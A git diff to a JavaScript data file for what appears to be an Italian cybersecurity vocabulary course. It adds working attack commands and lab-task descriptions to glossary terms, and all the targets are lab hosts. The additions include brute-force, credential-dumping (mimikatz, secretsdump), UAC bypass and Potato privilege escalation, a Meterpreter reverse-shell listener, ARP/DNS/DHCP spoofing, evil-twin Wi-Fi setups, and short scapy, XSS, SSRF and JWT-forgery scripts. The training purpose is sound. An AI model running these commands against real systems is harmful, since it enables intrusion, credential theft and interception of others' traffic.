@@ -1161,6 +1161,8 @@ export default {
               difficulty: 'beginner',
               tool: 'shodan.io',
               note: 'Il "Google" dei dispositivi IoT: trova webcam, server, router esposti.',
+              command: `shodan search 'apache port:443 country:IT'`,
+              task: 'Interroga Shodan dalla CLI per inventariare i dispositivi pubblicamente esposti riferibili al perimetro autorizzato dal cliente.',
             },
             {
               english: 'Censys',
@@ -1172,6 +1174,8 @@ export default {
               context: 'reconnaissance',
               difficulty: 'beginner',
               tool: 'censys.io',
+              command: `censys search 'services.service_name: HTTP and services.port: 8080'`,
+              task: 'Consulta Censys via CLI per individuare servizi HTTP non standard riconducibili agli asset documentati nel perimetro di audit.',
             },
             {
               english: 'theHarvester',
@@ -1207,6 +1211,8 @@ export default {
               context: 'reconnaissance',
               difficulty: 'beginner',
               tool: 'recon-ng',
+              command: 'recon-ng -w lab_recon',
+              task: 'Avvia un workspace di Recon-ng per orchestrare moduli OSINT durante la fase di pre-engagement autorizzata in laboratorio.',
             },
             {
               english: 'Certificate Transparency',
@@ -1218,6 +1224,8 @@ export default {
               context: 'reconnaissance',
               difficulty: 'beginner',
               tool: 'crt.sh',
+              command: `curl -s 'https://crt.sh/?q=example.com&output=json' | jq -r '.[].name_value' | sort -u`,
+              task: 'Raccogli i sottodomini storici di un asset autorizzato tramite i log di Certificate Transparency per stimare la superficie pubblica.',
             },
             {
               english: 'EXIF Data',
@@ -1229,6 +1237,8 @@ export default {
               context: 'reconnaissance',
               difficulty: 'beginner',
               tool: 'exiftool',
+              command: 'exiftool sample.jpg',
+              task: 'Estrai i metadati EXIF dalle immagini pubbliche del cliente per documentare quanti dati sensibili vengono inavvertitamente esposti.',
             },
             {
               english: 'Email Harvesting',
@@ -1397,6 +1407,8 @@ export default {
                 "Running a full port scan against the web server uncovered an unprotected MongoDB instance on port 27017. = Eseguendo una scansione completa delle porte sul server web si è scoperta un'istanza MongoDB non protetta sulla porta 27017.",
               context: 'scanning',
               difficulty: 'beginner',
+              command: 'nmap -p- --min-rate=1000 target.lab.internal',
+              task: `Effettua una scansione completa delle porte sul nodo di laboratorio per costruire l'inventario dei servizi raggiungibili.`,
             },
             {
               english: 'SYN Scan',
@@ -1474,6 +1486,8 @@ export default {
                 'To avoid triggering IDS alerts, the pentester used a stealth scan with slow timing and randomized port order. = Per evitare di attivare allarmi IDS, il pentester ha usato una scansione furtiva con tempistica lenta e ordine delle porte randomizzato.',
               context: 'scanning',
               difficulty: 'beginner',
+              command: 'nmap -sS -T2 -f --randomize-hosts target.lab.internal',
+              task: `Esegui una scansione poco rumorosa in laboratorio per misurare la sensibilita' delle regole rate-based dell'IDS interno.`,
             },
             {
               english: 'Service Detection',
@@ -1528,6 +1542,8 @@ export default {
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'enum4linux, smbclient',
+              command: 'enum4linux-ng -A target.lab.internal',
+              task: 'Enumera condivisioni, utenti e policy SMB del server di laboratorio per documentare i dati raggiungibili senza credenziali.',
             },
             {
               english: 'SNMP Enumeration',
@@ -1550,6 +1566,8 @@ export default {
                 "Anonymous bind was enabled, so LDAP enumeration returned every user, group, and OU in the Active Directory forest. = L'anonymous bind era abilitato, quindi l'enumerazione LDAP ha restituito ogni utente, gruppo e OU nella foresta Active Directory.",
               context: 'scanning',
               difficulty: 'beginner',
+              command: `ldapsearch -x -H ldap://dc.lab.internal -b 'dc=lab,dc=internal' -s sub '(objectClass=user)'`,
+              task: `Verifica con ldapsearch se il binding anonimo sul controller di laboratorio espone l'elenco degli utenti di dominio.`,
             },
             {
               english: 'DNS Enumeration',
@@ -1561,6 +1579,8 @@ export default {
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'dnsenum, dnsrecon',
+              command: 'dnsrecon -d example.lab -t std',
+              task: 'Esegui dnsrecon contro il dominio del laboratorio per scoprire record nascosti e confermare la correttezza della zona DNS.',
             },
             {
               english: 'NFS Enumeration',
@@ -1595,6 +1615,8 @@ export default {
                 'Establishing a null session to the domain controller revealed the full user list without needing any credentials. = Stabilire una sessione nulla verso il domain controller ha rivelato la lista completa degli utenti senza bisogno di credenziali.',
               context: 'scanning',
               difficulty: 'beginner',
+              command: `rpcclient -U '' -N target.lab.internal`,
+              task: 'Tenta una sessione nulla SMB verso il server Windows di test per documentare le informazioni esposte senza autenticazione.',
             },
             {
               english: 'Network Sweep',
@@ -1617,6 +1639,8 @@ export default {
                 'The pentester started with a ping sweep using nmap -sn to map which hosts were alive before running deeper scans. = Il pentester ha iniziato con una scansione ping usando nmap -sn per mappare quali host fossero attivi prima di eseguire scansioni più approfondite.',
               context: 'scanning',
               difficulty: 'beginner',
+              command: 'nmap -sn -PE -PA21,22,80,443 10.10.10.0/24',
+              task: 'Mappa rapidamente gli host attivi della sottorete di laboratorio per restringere il perimetro delle scansioni successive.',
             },
           ],
         },
@@ -1765,6 +1789,9 @@ export default {
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'gobuster, dirb, dirsearch',
+              command:
+                'gobuster dir -u https://target.lab.internal -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30',
+              task: `Scopri directory nascoste sull'app web di staging per segnalare endpoint dimenticati prima del rilascio in produzione.`,
             },
             {
               english: 'Robots.txt',
@@ -1775,6 +1802,8 @@ export default {
                 'Checking robots.txt revealed a Disallow entry for /internal-admin/, which the pentester then accessed directly. = Controllando robots.txt si è trovata una voce Disallow per /internal-admin/, che il pentester ha poi raggiunto direttamente.',
               context: 'scanning',
               difficulty: 'beginner',
+              command: 'curl -s https://target.lab.internal/robots.txt',
+              task: `Ispeziona il file robots.txt dell'applicazione di laboratorio per individuare percorsi sensibili dichiarati dagli sviluppatori.`,
             },
             {
               english: 'Sitemap',
@@ -1795,6 +1824,8 @@ export default {
                 "By fuzzing the Host header, virtual host enumeration discovered a hidden intranet portal on the same IP as the public site. = Facendo fuzzing sull'header Host, l'enumerazione degli host virtuali ha scoperto un portale intranet nascosto sullo stesso IP del sito pubblico.",
               context: 'scanning',
               difficulty: 'beginner',
+              command: `ffuf -u https://target.lab.internal -H 'Host: FUZZ.target.lab.internal' -w subdomains.txt -mc all -fs 0`,
+              task: `Effettua il fuzzing dell'header Host sull'applicazione di test per scoprire virtual host non documentati nell'inventario.`,
             },
             {
               english: 'Web Spider',
@@ -1805,6 +1836,9 @@ export default {
                 "The web spider crawled the application and discovered 1,200 unique URLs including forgotten test pages. = Il crawler ha navigato l'applicazione e ha scoperto 1.200 URL unici incluse pagine di test dimenticate.",
               context: 'scanning',
               difficulty: 'beginner',
+              command:
+                'wget --spider --recursive --no-verbose --reject css,js --output-file=spider.log https://target.lab.internal',
+              task: 'Lancia uno spider in laboratorio per mappare la struttura del sito e produrre un inventario delle pagine accessibili.',
             },
             {
               english: 'Response Code',
@@ -1837,6 +1871,9 @@ export default {
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'ffuf, amass',
+              command:
+                'ffuf -u https://FUZZ.example.lab -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fs 0',
+              task: 'Esegui un bruteforcing dei sottodomini del laboratorio per individuare ambienti di staging o test esposti pubblicamente.',
             },
             {
               english: 'WAF Detection',
@@ -1849,6 +1886,8 @@ export default {
               difficulty: 'beginner',
               tool: 'wafw00f',
               note: 'Web Application Firewall: può bloccare attacchi come SQL injection e XSS.',
+              command: 'wafw00f https://target.lab.internal',
+              task: `Identifica il WAF posto davanti all'applicazione di staging per allineare le successive verifiche al ruleset effettivo.`,
             },
             {
               english: 'CMS Detection',
@@ -1860,6 +1899,8 @@ export default {
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'WPScan, CMSmap',
+              command: 'whatweb -a 3 https://target.lab.internal',
+              task: `Rileva CMS e versioni in uso sull'app di test per associare i moduli alle vulnerabilita' note prima del rilascio.`,
             },
           ],
         },
@@ -1900,6 +1941,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'Tenable Nessus',
               note: 'Esiste in versione gratuita (Essentials) limitata a 16 IP.',
+              command: `/opt/nessus/sbin/nessuscli scan --policy 'Basic Network Scan' --target 10.10.0.0/24`,
+              task: `Avvia una scansione Nessus pianificata nel laboratorio per generare la baseline trimestrale delle vulnerabilita' note.`,
             },
             {
               english: 'OpenVAS',
@@ -2157,6 +2200,8 @@ export default {
               context: 'vuln-scanning',
               difficulty: 'intermediate',
               tool: 'vulners.com',
+              command: `curl -s https://vulners.com/api/v3/search/lucene/ -G --data-urlencode 'query=apache 2.4 type:cve' | jq .data.search[].title`,
+              task: `Interroga l'API di Vulners per correlare le versioni Apache rilevate dal vulnerability scanner alle CVE pubblicate piu' di recente.`,
             },
             {
               english: 'Patch Tuesday',
@@ -2450,6 +2495,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'Metasploit',
               note: 'Vive interamente in memoria: difficile da rilevare via scansione disco.',
+              command: `msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 4444; run'`,
+              task: 'Configura un listener Meterpreter di laboratorio per ricevere le shell generate dagli esercizi controllati e analizzare il traffico C2.',
             },
             {
               english: 'msfvenom',
@@ -2599,6 +2646,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'AFL, boofuzz',
               note: 'Tecnica per scoprire bug: si lanciano milioni di input casuali finché qualcosa si rompe.',
+              command: 'afl-fuzz -i inputs -o findings -- ./parser @@',
+              task: 'Avvia AFL contro il parser di laboratorio per generare input mutanti e individuare crash sfruttabili da analizzare nel debugger.',
             },
             {
               english: 'Crash',
@@ -2670,6 +2719,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'ROPgadget, mona.py',
               note: 'Mattoncino base del ROP: 2-5 istruzioni utili che finiscono con ret.',
+              command: 'ROPgadget --binary ./vuln --ropchain',
+              task: 'Cerca catene ROP utili nel binario di laboratorio per documentare quanto sia fattibile costruire un exploit senza shellcode.',
             },
             {
               english: 'Encoder',
@@ -2890,6 +2941,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'sqlmap',
               note: "L'app non mostra dati ma cambia comportamento in base al risultato della query.",
+              command: `sqlmap -u 'https://target.lab.internal/item?id=1' --technique=B --batch --level=3`,
+              task: `Verifica con sqlmap se un parametro vulnerabile dell'app di staging consente blind injection prima di rinforzare la prepared statement.`,
             },
             {
               english: 'Boolean-Based Blind SQLi',
@@ -3003,6 +3056,13 @@ export default {
               context: 'web-hacking',
               difficulty: 'intermediate',
               note: "Più pericolosa della riflessa: l'attacco si autoalimenta a ogni visita.",
+              code: `import requests
+
+payload = '<script>fetch("/csrf-token")</script>'
+requests.post('https://target.lab.internal/comments', data={'body': payload}, cookies={'session': 'TEST'})
+resp = requests.get('https://target.lab.internal/comments').text
+print('stored?', payload in resp)`,
+              task: 'Verifica con uno script Python in laboratorio che il sanitizer rimuova i tag script dai contenuti persistiti dagli utenti.',
             },
             {
               english: 'DOM XSS',
@@ -3049,6 +3109,8 @@ export default {
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'BeEF',
+              command: 'beef-xss',
+              task: 'Avvia il framework BeEF nel laboratorio isolato per studiare i moduli browser-side e calibrare le regole CSP da applicare in produzione.',
             },
             {
               english: 'XSS Filter Bypass',
@@ -3308,6 +3370,8 @@ export default {
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'Wapiti',
+              command: 'wapiti -u https://target.lab.internal -m sql,xss,exec --scope=domain',
+              task: `Sottoponi l'ambiente di staging a Wapiti per generare un report delle vulnerabilita' note da consegnare al team di sviluppo.`,
             },
             {
               english: 'WPScan',
@@ -3372,6 +3436,12 @@ export default {
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'Burp Collaborator',
+              code: `import requests, uuid
+
+collab = f'{uuid.uuid4().hex}.collab.lab.internal'
+requests.post('https://target.lab.internal/fetch', json={'url': f'http://{collab}/'})
+print('Verifica i log DNS del Collaborator per:', collab)`,
+              task: `Inserisci un dominio Collaborator nei parametri dell'API di laboratorio per confermare la presenza di SSRF cieche tramite callback DNS.`,
             },
             {
               english: 'Cloud Metadata SSRF',
@@ -3482,6 +3552,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'ysoserial',
               note: 'OWASP A8. Particolarmente comune in Java, .NET, PHP, Python (pickle).',
+              command: `java -jar ysoserial.jar CommonsCollections5 'id' | base64 > payload.b64`,
+              task: 'Genera un payload serializzato di laboratorio per stressare il filtro di deserializzazione e validare la nuova allowlist Java.',
             },
             {
               english: 'ysoserial',
@@ -3655,6 +3727,13 @@ export default {
               context: 'web-hacking',
               difficulty: 'intermediate',
               note: "Attacco classico: l'app accetta HS256 ma usa la chiave pubblica RSA come HMAC secret.",
+              code: `import jwt
+
+with open('public.pem') as f:
+    pub = f.read()
+forged = jwt.encode({'role': 'admin'}, pub, algorithm='HS256')
+print('Test token:', forged)`,
+              task: 'Costruisci in sandbox un token HS256 firmato con la chiave pubblica RSA per confermare che la libreria rifiuti algoritmi confusi.',
             },
             {
               english: 'JWT Brute Force',
@@ -3869,6 +3948,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'ettercap',
+              command: 'ettercap -T -q -i eth0 -M arp:remote /10.10.10.10// /10.10.10.1//',
+              task: 'Esegui un ARP poisoning controllato nel laboratorio per validare che il Dynamic ARP Inspection sugli switch blocchi le associazioni false.',
             },
             {
               english: 'Man in the Middle',
@@ -3906,6 +3987,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'sslstrip',
               note: 'Mitigato da HSTS: il browser ricorda di usare sempre HTTPS.',
+              command: 'sslstrip -l 10000 -w /tmp/sslstrip.log',
+              task: 'Avvia sslstrip nel laboratorio MITM per confermare che la policy HSTS preloaded impedisca il downgrade delle sessioni HTTPS dei client.',
             },
             {
               english: 'Packet Sniffing',
@@ -3967,6 +4050,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'ettercap',
+              command: 'ettercap -T -q -i eth0 -M port:remote /10.10.10.10//',
+              task: `Riproduci un port stealing in laboratorio per dimostrare al network team perche' attivare la port security limiti il furto dei MAC sui trunk.`,
             },
           ],
         },
@@ -3985,6 +4070,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'ettercap dns_spoof plugin',
+              command: 'ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.10.10.10//',
+              task: 'Avvia un DNS spoofing nel laboratorio segregato per misurare quanti client adottano ancora resolver senza DNSSEC validation.',
             },
             {
               english: 'DNS Cache Poisoning',
@@ -4006,6 +4093,15 @@ export default {
                 'On the local network, the pentester used DNS spoofing to forge responses for the corporate email server, redirecting users to a cloned login page that harvested credentials. = Sulla rete locale, il pentester ha usato DNS spoofing per falsificare le risposte per il server email aziendale, reindirizzando gli utenti verso una pagina di login clonata che raccoglieva credenziali.',
               context: 'network-hacking',
               difficulty: 'intermediate',
+              code: `from scapy.all import sniff, send, IP, UDP, DNS, DNSRR
+
+def handle(pkt):
+    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
+        spoof = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='10.10.10.99'))
+        send(spoof, verbose=0)
+
+sniff(filter='udp port 53', prn=handle, iface='eth0')`,
+              task: 'Esegui lo script in sandbox per dimostrare al SOC come una risposta DNS falsificata possa essere rilevata dalla telemetria DPI.',
             },
             {
               english: 'DHCP Starvation',
@@ -4018,6 +4114,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'yersinia',
               note: "L'attaccante richiede tutti gli IP, poi può fare rogue DHCP server.",
+              command: 'yersinia dhcp -attack 1 -interface eth0',
+              task: 'Esaurisci il pool DHCP del laboratorio con Yersinia per verificare che gli switch attivino il DHCP snooping con port-security configurato.',
             },
             {
               english: 'Rogue DHCP',
@@ -4029,6 +4127,9 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'Responder',
+              command:
+                'dnsmasq --interface=eth0 --dhcp-range=10.10.10.100,10.10.10.200,12h --dhcp-option=3,10.10.10.99',
+              task: 'Configura un DHCP malevolo in laboratorio per validare che il DHCP snooping degli switch identifichi e blocchi gli offer non autorizzati.',
             },
             {
               english: 'LLMNR Poisoning',
@@ -4041,6 +4142,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'Responder',
               note: 'Link-Local Multicast Name Resolution: usato come fallback quando il DNS fallisce.',
+              command: 'responder -I eth0 -wfb',
+              task: 'Avvia Responder nella VLAN utenti del laboratorio per quantificare quanti client trasmettono ancora query LLMNR broadcast risolvibili.',
             },
             {
               english: 'NBT-NS Poisoning',
@@ -4052,6 +4155,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'Responder',
+              command: 'responder -I eth0 -A',
+              task: `Esegui Responder in modalita' di analisi nel laboratorio segregato per rilevare i client legacy che usano ancora NBT-NS broadcast.`,
             },
             {
               english: 'Responder',
@@ -4077,6 +4182,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'iodine, dnscat2',
               note: 'Tecnica per bypassare firewall: il DNS è quasi sempre permesso.',
+              command: 'iodined -f -c -P labpassword 10.0.0.1 tunnel.lab.internal',
+              task: 'Allestisci iodined nel laboratorio chiuso per generare traffico di tunneling DNS e affinare le regole di detection del SIEM.',
             },
             {
               english: 'DNS Rebinding',
@@ -4140,6 +4247,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'macof',
               note: 'Riempire la tabella MAC fa fare flooding allo switch: tutto il traffico diventa visibile.',
+              command: 'macof -i eth0 -n 100000',
+              task: 'Stressa la CAM table dello switch di laboratorio con macof per confermare che la port security limiti il numero di MAC consentiti per porta.',
             },
             {
               english: 'macof',
@@ -4164,6 +4273,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               note: 'Spanning Tree Protocol: si annuncia bridge ID più basso per diventare root.',
+              command: 'yersinia stp -attack 4 -interface eth0',
+              task: 'Inietta BPDU root-bridge nel laboratorio chiuso per verificare che il BPDU guard sugli access switch blocchi immediatamente la porta.',
             },
             {
               english: 'CDP Spoofing',
@@ -4175,6 +4286,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               note: 'Cisco Discovery Protocol: rivela info sui device Cisco vicini.',
+              command: 'yersinia cdp -attack 1 -interface eth0',
+              task: `Falsifica annunci CDP nel laboratorio per dimostrare al team di rete perche' disabilitare CDP sulle porte di accesso non strategiche.`,
             },
             {
               english: 'ICMP Redirect',
@@ -4185,6 +4298,12 @@ export default {
                 "The attacker sent crafted ICMP redirect messages to the victim host, altering its routing table so all traffic to the gateway flowed through the attacker's machine instead. = L'attaccante ha inviato messaggi ICMP redirect costruiti ad hoc all'host vittima, alterando la sua tabella di routing in modo che tutto il traffico verso il gateway passasse attraverso la macchina dell'attaccante.",
               context: 'network-hacking',
               difficulty: 'intermediate',
+              code: `from scapy.all import IP, ICMP, send
+
+for _ in range(5):
+    pkt = IP(src='10.10.10.1', dst='10.10.10.50')/ICMP(type=5, code=1, gw='10.10.10.99')
+    send(pkt, iface='eth0', verbose=0)`,
+              task: 'Invia ICMP Redirect in laboratorio per confermare che gli host hardenati ignorino i redirect non originati dal gateway configurato.',
             },
             {
               english: 'Bettercap',
@@ -4209,6 +4328,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'yersinia',
+              command: 'yersinia -I',
+              task: `Avvia Yersinia in modalita' interattiva nel laboratorio per esercitarsi su attacchi DTP, STP, CDP e DHCP in modo controllato.`,
             },
           ],
         },
@@ -4287,6 +4408,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'ligolo-ng',
+              command: 'ligolo-ng -selfcert -laddr 0.0.0.0:11601',
+              task: 'Avvia il proxy Ligolo-ng sul jump host di laboratorio per simulare uno scenario di pivoting tipico delle operazioni red team.',
             },
             {
               english: 'proxychains',
@@ -4324,6 +4447,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'icmptunnel',
+              command: 'icmptunnel -s 10.0.0.1',
+              task: 'Allestisci un tunnel ICMP nel laboratorio segregato per studiare il pattern dei pacchetti echo e calibrare la detection del firewall stateful.',
             },
             {
               english: 'Port Knocking',
@@ -4335,6 +4460,8 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'knockd',
+              command: 'knock target.lab.internal 7000 8000 9000',
+              task: 'Invia la sequenza di knock corretta verso il server di laboratorio per documentare la robustezza del demone knockd configurato.',
             },
           ],
         },
@@ -4429,6 +4556,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'hcxdumptool, hashcat',
               note: 'Pairwise Master Key ID. Scoperto nel 2018, attacca AP senza bisogno di client connessi.',
+              command: 'hcxpcapngtool -o hash.hc22000 capture.pcapng',
+              task: 'Converti la cattura wireless del laboratorio in formato hashcat 22000 per analizzare quante reti espongono PMKID attaccabili offline.',
             },
             {
               english: 'WPS',
@@ -4480,6 +4609,9 @@ export default {
               difficulty: 'intermediate',
               tool: 'aircrack-ng',
               note: 'Suite di tool: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng.',
+              command:
+                'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake.cap',
+              task: `Sottoponi l'handshake WPA2 catturato in laboratorio ad aircrack-ng per stimare il tempo necessario al cracking della passphrase corrente.`,
             },
             {
               english: 'airodump-ng',
@@ -4526,6 +4658,8 @@ export default {
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'kismet',
+              command: 'kismet -c wlan0mon',
+              task: `Avvia Kismet sull'adattatore monitor del laboratorio per mappare SSID, BSSID nascosti e individuare access point rogue nelle vicinanze.`,
             },
             {
               english: 'Hashcat',
@@ -4600,6 +4734,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'wifiphisher, airgeddon',
               note: 'Si crea un AP gemello con stesso SSID per ingannare le vittime.',
+              command: 'airbase-ng -e CORPLAB -c 6 -P wlan0mon',
+              task: 'Allestisci un evil twin nel laboratorio chiuso per verificare che i client aziendali validino il certificato del RADIUS prima di connettersi.',
             },
             {
               english: 'Deauthentication Attack',
@@ -4626,6 +4762,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'mana-toolkit',
               note: 'Sfrutta i client che cercano reti note: l\'attaccante risponde "sì, sono io".',
+              command: 'hostapd-mana /etc/mana-toolkit/hostapd-mana.conf',
+              task: 'Avvia hostapd-mana nel laboratorio isolato per misurare quanti dispositivi accettano automaticamente reti spoofed senza interazione utente.',
             },
             {
               english: 'Beacon Flood',
@@ -4650,6 +4788,8 @@ export default {
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'wifiphisher',
+              command: 'wifiphisher -nE -aI wlan1 -jI wlan0 -p firmware-upgrade',
+              task: 'Esegui Wifiphisher con scenario di upgrade firmware nel laboratorio per misurare la consapevolezza dei dipendenti durante il training.',
             },
             {
               english: 'Captive Portal',
@@ -4679,6 +4819,9 @@ export default {
               example: `Unlike deauthentication, a disassociation attack targets the association between client and AP at a lower layer, forcing devices to repeat the full connection sequence. = A differenza della deautenticazione, un attacco di disassociation prende di mira l'associazione tra client e AP a un livello inferiore, forzando i dispositivi a ripetere l'intera sequenza di connessione.`,
               context: 'wireless',
               difficulty: 'intermediate',
+              command:
+                'aireplay-ng --disassociation 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon',
+              task: 'Invia frame di disassociation mirati nel laboratorio Wi-Fi per validare la rilevazione del wIDS interno e la copertura 802.11w.',
             },
             {
               english: 'Pixie Dust Attack',
@@ -4703,6 +4846,8 @@ export default {
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'bluez, btlejack',
+              command: 'bluetoothctl scan on',
+              task: 'Avvia una scansione Bluetooth nel laboratorio per inventariare i dispositivi rilevabili e individuare quelli configurati con PIN predefinito.',
             },
           ],
         },
@@ -4843,6 +4988,9 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               note: 'Più lunga la password, più lungo il tempo: cresce esponenzialmente.',
+              command:
+                'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://target.lab.internal',
+              task: `Lancia Hydra contro il servizio SSH di test per verificare l'efficacia delle soglie di blocco account e del fail2ban configurato.`,
             },
             {
               english: 'Dictionary Attack',
@@ -4854,6 +5002,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'rockyou.txt',
+              command: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
+              task: 'Sottoponi gli hash di laboratorio a una wordlist nota per misurare quanti utenti usano ancora password comuni dopo la campagna di sensibilizzazione.',
             },
             {
               english: 'Hybrid Attack',
@@ -4911,6 +5061,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'hashcat',
+              command: 'hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt',
+              task: 'Combina due wordlist nel laboratorio per stimare quanto le passphrase composte resistano a un attacco combinatorio mirato.',
             },
             {
               english: 'Credential Stuffing',
@@ -4932,6 +5084,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'kerbrute',
               note: 'Evita lockout: una password per utente, non viceversa.',
+              command: `kerbrute passwordspray -d lab.internal users.txt 'Spring2026!'`,
+              task: 'Effettua uno spray controllato sul dominio di laboratorio per verificare che la policy di rate limiting Kerberos rilevi i tentativi distribuiti.',
             },
             {
               english: 'Online Attack',
@@ -5002,6 +5156,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'medusa',
+              command: 'medusa -h target.lab.internal -U users.txt -P passwords.txt -M smbnt -t 16',
+              task: 'Esegui Medusa contro il server SMB di test per confrontare la sua parallelizzazione con Hydra durante una sessione di audit credenziali.',
             },
             {
               english: 'Patator',
@@ -5012,6 +5168,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'patator',
+              command: `patator http_fuzz url=https://target.lab.internal/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt -x ignore:code=401`,
+              task: `Modella un attacco brute force su un'API JSON di laboratorio con Patator per validare le contromisure di rate limiting personalizzate.`,
             },
             {
               english: 'Ncrack',
@@ -5022,6 +5180,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'ncrack',
+              command: 'ncrack -p ssh -U users.txt -P passwords.txt 10.10.0.0/24',
+              task: 'Esegui Ncrack sulla sottorete di laboratorio per identificare host SSH che accettano ancora credenziali deboli da rimuovere prima del rilascio.',
             },
             {
               english: 'Custom Wordlist',
@@ -5087,6 +5247,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'hashid, hash-identifier',
+              command: 'hashid -m hashes.txt',
+              task: `Identifica i formati di hash in un dump di laboratorio per scegliere il modulo hashcat corretto durante l'audit periodico delle credenziali.`,
             },
             {
               english: 'MD5',
@@ -5243,6 +5405,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'secretsdump.py',
+              command: 'secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL',
+              task: 'Estrai offline gli hash NTDS dal backup di laboratorio per verificare la presenza di password duplicate tra account amministrativi.',
             },
             {
               english: 'secretsdump',
@@ -5292,6 +5456,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'mimikatz, Rubeus',
+              command: 'Rubeus.exe ptt /ticket:base64ticket',
+              task: `Inietta un ticket Kerberos di laboratorio con Rubeus per validare l'allerta SIEM legata all'uso anomalo di TGS riutilizzati.`,
             },
             {
               english: 'LSASS Dump',
@@ -5316,6 +5482,8 @@ export default {
               context: 'password-cracking',
               difficulty: 'intermediate',
               tool: 'mimikatz vault::list',
+              command: `mimikatz.exe 'privilege::debug' 'vault::list' 'exit'`,
+              task: `Elenca le credenziali nel vault Windows del laboratorio per verificare che la Credential Guard ne impedisca l'estrazione in chiaro.`,
             },
           ],
         },
@@ -5408,6 +5576,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'linux-exploit-suggester',
               note: 'DirtyCow, DirtyPipe sono famosi kernel exploit Linux.',
+              command: 'linux-exploit-suggester.sh -k $(uname -r)',
+              task: 'Consulta linux-exploit-suggester nel laboratorio per documentare se la versione del kernel sia esposta a Dirty Pipe e CVE associate.',
             },
             {
               english: 'UAC Bypass',
@@ -5419,6 +5589,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'UACME',
               note: 'User Account Control. Decine di tecniche pubbliche di bypass.',
+              command: 'Akagi64.exe 23 C:\\\\Windows\\\\System32\\\\cmd.exe',
+              task: 'Riproduci il bypass UAC tramite UACME in un host Windows di test per generare telemetria utile a calibrare le regole di detection EDR.',
             },
             {
               english: 'Token Impersonation',
@@ -5429,6 +5601,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'incognito (Meterpreter)',
+              command: `load incognito; list_tokens -u; impersonate_token 'NT AUTHORITY\\\\SYSTEM'`,
+              task: `Esercita il modulo incognito in laboratorio per misurare quanto rapidamente Sysmon individui l'impersonazione anomala di token privilegiati.`,
             },
             {
               english: 'Potato Attack',
@@ -5440,6 +5614,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'JuicyPotato, RoguePotato, GodPotato',
               note: 'Famiglia di exploit: HotPotato, RottenPotato, JuicyPotato, RoguePotato, GodPotato.',
+              command: `GodPotato.exe -cmd 'cmd.exe /c whoami'`,
+              task: 'Esegui un Potato attack nel laboratorio Windows isolato per validare le mitigazioni RPC e le firme di rilevamento dell EDR.',
             },
           ],
         },
@@ -5538,6 +5714,9 @@ export default {
               difficulty: 'intermediate',
